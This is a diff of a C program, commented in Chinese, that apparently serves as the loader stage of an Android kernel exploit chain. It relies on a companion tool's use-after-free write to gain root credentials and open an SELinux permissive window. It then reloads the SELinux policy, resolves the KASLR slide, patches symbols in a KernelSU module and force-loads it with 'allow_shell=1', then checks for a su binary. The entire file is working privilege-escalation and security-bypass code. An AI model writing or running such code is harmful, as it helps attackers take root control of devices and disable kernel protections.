@@ -1,19 +1,17 @@
 /*
  * c99491_load —— 单进程 KernelSU 模块加载器。
  *
- * 设计依据（实测）：
- *   1. 被改 cred 的进程（uid=0 + effective 能力）可合法写
- *      /sys/fs/selinux/enforce —— 无需写 selinux_state 内存；
- *   2. 单次 UAF 写命中目标且不逃逸（E2 实测：boot_id 被改写、enforce 保持
- *      Enforcing、60s 无重启）；多字段连写才是风险来源，所以能力只看
- *      **CapEff**（进程内 finit_module / setenforce 都只查 effective）。
- *   3. KO 的 225 个未定义符号用离线表改成 SHN_ABS + (链接期地址 + slide)。
+ * 顺序（对齐上游 v2 一加移植的恢复序列）：
+ *   1. 等 ctest 改好 cred（uid=0 且 CapEff 含 SYS_MODULE+SYSLOG）
+ *   2. 尝试 setenforce(0)；若被拒（Enforcing 下会 rc=-1）则等 ctest 开窗
+ *   3. **窗口内重载策略**：读 /sys/fs/selinux/policy 写回 /sys/fs/selinux/load
+ *      —— 由内核按策略重建 initialized 与 policycap（写内存修不回来）
+ *   4. 求 slide（--slide / slide.txt / kallsyms）
+ *   5. 解析 KO symtab，把未定义符号改成 SHN_ABS + (链接期地址 + slide)
+ *   6. memfd → finit_module
+ *   7. setenforce(1)
  *
- * 流程：等 cred（uid=0 且 CapEff 含 SYS_MODULE+SYSLOG）→ setenforce 0 →
- *       求 slide → 打补丁 → finit_module → setenforce 1。
- *
- * 用法：c99491_load [--slide 0x..] [--ko path] [--table path]
- * 日志：/data/local/tmp/c99491_load.log（0666）
+ * 日志：/data/local/tmp/l26load.log（0666，启动时先 unlink 旧文件）
  */
 #define _GNU_SOURCE 1
 #include <errno.h>
@@ -27,11 +25,13 @@
 #include <time.h>
 #include <unistd.h>
 
-#define LOG_PATH "/data/local/tmp/c99491_load.log"
+#define LOG_PATH "/data/local/tmp/l26load.log"
 #define DEFAULT_KO "/data/local/tmp/ksu.ko"
 #define DEFAULT_TABLE "/data/local/tmp/ksu_syms.txt"
 #define SLIDE_FILE "/data/local/tmp/slide.txt"
 #define KPTR_PATH "/proc/sys/kernel/kptr_restrict"
+#define POLICY_PATH "/sys/fs/selinux/policy"
+#define LOAD_PATH "/sys/fs/selinux/load"
 #define MAX_SYMS 512
 #define SHN_UNDEF 0
 #define SHN_ABS 0xfff1
@@ -134,6 +134,49 @@ static int write_str(const char *path, const char *s)
 	return rc > 0 ? 0 : -1;
 }
 
+/* 重载运行策略：内核据此重建 initialized 与 policycap */
+static int reload_policy(void)
+{
+	int in, out;
+	unsigned char *buf;
+	ssize_t total = 0, n;
+	int ok = -1;
+
+	in = open(POLICY_PATH, O_RDONLY);
+	if (in < 0) {
+		logf_("reload: open policy errno=%d\n", errno);
+		return -1;
+	}
+	buf = malloc(4 * 1024 * 1024);
+	if (!buf) {
+		close(in);
+		return -1;
+	}
+	while ((n = read(in, buf + total, 4 * 1024 * 1024 - (size_t)total)) > 0)
+		total += n;
+	close(in);
+	if (total <= 0) {
+		logf_("reload: policy empty errno=%d\n", errno);
+		free(buf);
+		return -1;
+	}
+	out = open(LOAD_PATH, O_WRONLY);
+	if (out < 0) {
+		logf_("reload: open load errno=%d\n", errno);
+		free(buf);
+		return -1;
+	}
+	errno = 0;
+	n = write(out, buf, (size_t)total);
+	logf_("reload: policy=%ld written=%ld errno=%d (%s)\n",
+	      (long)total, (long)n, errno, strerror(errno));
+	if (n == total)
+		ok = 0;
+	close(out);
+	free(buf);
+	return ok;
+}
+
 static unsigned long long table_lookup(const char *name)
 {
 	for (int i = 0; i < ntbl; i++)
@@ -148,7 +191,7 @@ static int load_table(const char *path)
 	char line[160];
 
 	if (!f) {
-		logf_("open table failed errno=%d\n", errno);
+		logf_("table open errno=%d\n", errno);
 		return -1;
 	}
 	while (fgets(line, sizeof(line), f) && ntbl < MAX_SYMS) {
@@ -232,6 +275,7 @@ int main(int argc, char **argv)
 	char *strtab = NULL;
 	size_t strsize = 0;
 
+	unlink(LOG_PATH);
 	g_log = fopen(LOG_PATH, "w");
 	if (!g_log)
 		return 1;
@@ -247,7 +291,7 @@ int main(int argc, char **argv)
 			table = argv[++i];
 	}
 
-	/* 1) 等 cred：uid=0 且 CapEff 含 SYS_MODULE(16) + SYSLOG(34) */
+	/* 1) 等 cred */
 	for (int i = 0; i < 320; i++) {
 		unsigned long long eff = cap_of("CapEff:");
 
@@ -267,16 +311,21 @@ int main(int argc, char **argv)
 		return 3;
 	}
 
-	/* 2) 合法 setenforce 开窗 */
+	/* 2) 尝试自己开窗；失败则等 ctest 用 UAF 写开窗 */
 	logf_("enforce_before=%d\n", enforce_now());
 	logf_("setenforce(0) rc=%d\n", set_enforce(0));
+	for (int i = 0; i < 100 && enforce_now() != 0; i++)
+		usleep(200000);
 	logf_("enforce_window=%d\n", enforce_now());
 	if (enforce_now() != 0) {
-		logf_("=== abort: setenforce 失败 ===\n");
+		logf_("=== abort: 窗口未打开 ===\n");
 		return 4;
 	}
 
-	/* 3) slide */
+	/* 3) 窗口内重载策略（重建 initialized / policycap） */
+	logf_("reload rc=%d\n", reload_policy());
+
+	/* 4) slide */
 	if (!slide)
 		slide = slide_from_file();
 	if (slide)
@@ -286,28 +335,23 @@ int main(int argc, char **argv)
 		logf_("slide(kallsyms)=%#llx\n", slide);
 	}
 	if (!slide) {
-		logf_("restore enforce rc=%d\n", set_enforce(1));
+		logf_("restore rc=%d\n", set_enforce(1));
 		logf_("=== abort: 无 slide ===\n");
 		return 5;
 	}
 
-	/* 4) 读 KO 并打补丁 */
+	/* 5) 读 KO 并打补丁 */
 	fd = open(ko_path, O_RDONLY);
-	if (fd < 0) {
-		logf_("open ko failed errno=%d\n", errno);
+	if (fd < 0 || fstat(fd, &st) != 0) {
+		logf_("ko open/stat errno=%d\n", errno);
 		set_enforce(1);
 		return 6;
 	}
-	if (fstat(fd, &st) != 0) {
-		logf_("stat ko failed errno=%d\n", errno);
-		set_enforce(1);
-		return 7;
-	}
 	img = malloc((size_t)st.st_size);
 	if (!img || read(fd, img, (size_t)st.st_size) != (ssize_t)st.st_size) {
-		logf_("read ko failed\n");
+		logf_("ko read failed\n");
 		set_enforce(1);
-		return 8;
+		return 7;
 	}
 	close(fd);
 	logf_("ko size=%ld\n", (long)st.st_size);
@@ -316,7 +360,7 @@ int main(int argc, char **argv)
 	if (memcmp(eh->e_ident, "\177ELF", 4) != 0) {
 		logf_("not ELF\n");
 		set_enforce(1);
-		return 9;
+		return 8;
 	}
 	sh = (struct shdr64 *)(img + eh->e_shoff);
 
@@ -328,7 +372,6 @@ int main(int argc, char **argv)
 			strtab = (char *)(img + sh[sh[i].sh_link].sh_offset);
 			strsize = (size_t)sh[sh[i].sh_link].sh_size;
 			logf_("symtab syms=%d\n", nsym);
-
 			for (int k = 1; k < nsym; k++) {
 				const char *nm;
 				unsigned long long addr;
@@ -354,35 +397,29 @@ int main(int argc, char **argv)
 	}
 	logf_("patched=%d missing=%d\n", patched, missing);
 	if (missing > 0) {
-		logf_("restore enforce rc=%d\n", set_enforce(1));
+		set_enforce(1);
 		logf_("=== abort: 缺符号 ===\n");
+		return 9;
+	}
+
+	/* 6) memfd + finit_module */
+	memfd = (int)syscall(SYS_memfd_create, "ksu", 0);
+	if (memfd < 0 || write(memfd, img, (size_t)st.st_size) != (ssize_t)st.st_size) {
+		logf_("memfd failed errno=%d\n", errno);
+		set_enforce(1);
 		return 10;
 	}
-
-	/* 5) memfd + finit_module */
-	memfd = (int)syscall(SYS_memfd_create, "ksu", 0);
-	if (memfd < 0) {
-		logf_("memfd_create failed errno=%d\n", errno);
-		set_enforce(1);
-		return 11;
-	}
-	if (write(memfd, img, (size_t)st.st_size) != (ssize_t)st.st_size) {
-		logf_("memfd write failed errno=%d\n", errno);
-		set_enforce(1);
-		return 12;
-	}
 	lseek(memfd, 0, SEEK_SET);
-
 	errno = 0;
 	rc = (int)syscall(SYS_finit_module, memfd, "allow_shell=1", 0);
 	logf_("finit_module rc=%d errno=%d (%s)\n", rc, errno, strerror(errno));
 	close(memfd);
 
-	/* 6) 立刻恢复 Enforcing */
-	logf_("restore enforce rc=%d\n", set_enforce(1));
+	/* 7) 恢复 Enforcing */
+	logf_("restore rc=%d\n", set_enforce(1));
 	logf_("enforce_after=%d\n", enforce_now());
 	logf_("su_exists=%d\n", access("/system/bin/su", X_OK) == 0);
 	logf_("=== done ===\n");
 	fclose(g_log);
-	return rc == 0 ? 0 : 13;
+	return rc == 0 ? 0 : 11;
 }
